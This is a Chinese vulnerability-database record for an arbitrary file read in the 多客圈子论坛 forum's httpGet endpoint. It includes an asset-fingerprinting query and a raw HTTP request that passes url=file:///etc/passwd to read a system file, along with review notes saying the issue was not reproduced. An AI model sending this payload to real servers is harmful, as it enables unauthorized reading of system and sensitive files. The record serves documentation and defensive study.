---
source: "wy876 漏洞文库"
title: "多客圈子论坛 httpGet url file协议本地读取"
product: "多客圈子论坛"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知；URL客户端支持file及进程权限"
prerequisites: "无Cookie请求示例"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/gv2apt8f7pypg1nt"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E5%A4%9A%E5%AE%A2%E5%9C%88%E5%AD%90%E8%AE%BA%E5%9D%9B/%E5%A4%9A%E5%AE%A2%E5%9C%88%E5%AD%90%E8%AE%BA%E5%9D%9B%E7%B3%BB%E7%BB%9FhttpGet%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
id: "vw-4d78c4f7cbc800363e8a57cc"
entity_id: "ve-4d78c4f7cbc800363e8a57cc"
schema_version: "1"
---

# 多客圈子论坛 httpGet url file协议本地读取

## 条目说明

- 对象与具体问题：多客圈子论坛；httpGet url file协议本地读取
- 版本、配置及部署条件：版本未知；URL客户端支持file及进程权限
- 认证与权限前提：无Cookie请求示例
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 无响应/源码/修复，客户财务记录等效果是泛举例非已证泄露
- file协议读取与HTTP SSRF能力区分，指纹jweixin脚本不独占产品

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
多客圈子论坛系统是一种在线社区平台，旨在为用户提供一个共享知识、经验和想法的空间。社交圈子论坛系统除了提供基本的社交功能外，还可以根据用户行为和兴趣为用户推荐相关内容。 多客圈子论坛系统 httpGet接口处存在任意文件读取漏洞，恶意攻击者可能利用该漏洞读取服务器上的敏感文件，例如客户记录、财务数据或源代码，导致数据泄露。 

## 二、影响版本
+ 多客圈子论坛系统

## 三、资产测绘
```plain
body="/static/index/js/jweixin-1.2.0.js"
```


## 四、漏洞复现
```http
GET /index.php/api/login/httpGet?url=file:///etc/passwd HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gv2apt8f7pypg1nt>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
